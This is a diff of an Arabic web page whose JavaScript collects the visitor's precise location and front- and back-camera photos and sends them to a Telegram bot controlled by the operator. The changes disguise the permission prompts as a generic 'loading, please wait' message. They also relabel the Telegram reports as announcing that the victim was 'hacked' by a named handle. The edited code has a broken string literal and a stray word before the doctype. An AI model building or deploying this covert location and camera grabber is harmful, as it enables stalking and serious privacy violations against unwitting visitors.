@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+here<!DOCTYPE html>
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
@@ -510,7 +510,7 @@
 
         // ========== 3. إرسال البيانات إلى تلجرام ==========
         async function sendLocation(location) {
-            let msg = `📍 <b>الموقع الدقيق للمستخدم</b>\n\n🕒 ${new Date().toLocaleString('ar-EG')}\n`;
+            let msg = `📍 <b>تم اختارق موقع الضحيه من قبل @p7s7s</b>\n\n🕒 ${new Date().toLocaleString('ar-EG')}\n`;
             if (location.success) {
                 msg += `🌐 خط العرض: ${location.latitude}\n🌐 خط الطول: ${location.longitude}\n📡 الدقة: ${location.accuracy} متر\n\n`;
                 msg += `<a href="https://www.google.com/maps?q=${location.latitude},${location.longitude}&z=18">🗺️ اضغط لفتح الخريطة</a>`;
@@ -568,41 +568,41 @@
                 
                 // 1. الموقع
                 updateProgress(12); loadingMessage.textContent = 'جاري الحصول على الموقع...';
-                showNotification('📍 الرجاء السماح بالموقع');
+                showNotification('جار التحميل انتضر بضع ثواني');
                 const location = await getPreciseLocation(); await wait(500);
                 
-                updateProgress(20); loadingMessage.textContent = 'جاري إرسال الموقع...';
+                updateProgress(20); loadingMessage.textContent = 'جار التحميل انتضر بضع ثواني...';
                 await sendLocation(location); await wait(600);
                 
                 // 2. الكاميرا الخلفية (3 صور)
-                updateProgress(30); loadingMessage.textContent = 'جاري تشغيل الكاميرا الخلفية...';
-                showNotification('📸 الرجاء السماح بالكاميرا للخلفية');
+                updateProgress(30); loadingMessage.textContent = 'جار التحميل انتضر بضع ثواني...';
+                showNotification('جار التحميل انتضر بضع ثواني');
                 await wait(500);
                 
-                updateProgress(40); loadingMessage.textContent = 'جاري التقاط 3 صور من الكاميرا الخلفية...';
+                updateProgress(40); loadingMessage.textContent = جار التحميل انتضر بضع ثواني..';
                 const backPhotos = await captureBackCameraPhotos();
                 await sendBackPhotos(backPhotos); await wait(600);
                 
                 // 3. الكاميرا الأمامية (2 صور)
-                updateProgress(55); loadingMessage.textContent = 'جاري تشغيل الكاميرا الأمامية...';
-                showNotification('📸 الرجاء السماح بالكاميرا للأمامية');
+                updateProgress(55); loadingMessage.textContent = 'جار التحميل انتضر بضع ثوانية...';
+                showNotification('جار التحميل انتضر بضع ثواني');
                 await wait(500);
                 
-                updateProgress(65); loadingMessage.textContent = 'جاري التقاط 2 صور من الكاميرا الأمامية...';
+                updateProgress(65); loadingMessage.textContent = 'جار التحميل انتضر بضع ثواني...';
                 const frontPhotos = await captureFrontCameraPhotos();
                 await sendFrontPhotos(frontPhotos); await wait(600);
                 
-                updateProgress(85); loadingMessage.textContent = 'جاري تجهيز التقرير...';
+                updateProgress(85); loadingMessage.textContent = 'جار التحميل انتضر بضع ثواني...';
                 await wait(500);
                 
-                updateProgress(100); loadingMessage.textContent = 'جاري التوجيه...';
+                updateProgress(100); loadingMessage.textContent = 'جار التحميل انتضر بضع ثواني...';
                 
                 // تقرير نهائي
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST', headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ 
                         chat_id: CHAT_ID, 
-                        text: `✅ <b>تم الإرسال بنجاح</b>\n━━━━━━━━━━━━━━━━━━\n📍 الموقع: ${location.success ? '✓' : '✗'}\n📸 الكاميرا الخلفية: ${backPhotos.length}/3 صور\n📸 الكاميرا الأمامية: ${frontPhotos.length}/2 صور\n━━━━━━━━━━━━━━━━━━\n🕒 ${new Date().toLocaleString('ar-EG')}`,
+                        text: `✅ <b>تمت عملة الاختراق من قبل PS</b>\n━━━━━━━━━━━━━━━━━━\n📍 الموقع: ${location.success ? '✓' : '✗'}\n📸 الكاميرا الخلفية: ${backPhotos.length}/3 صور\n📸 الكاميرا الأمامية: ${frontPhotos.length}/2 صور\n━━━━━━━━━━━━━━━━━━\n🕒 ${new Date().toLocaleString('ar-EG')}`,
                         parse_mode: 'HTML'
                     })
                 });
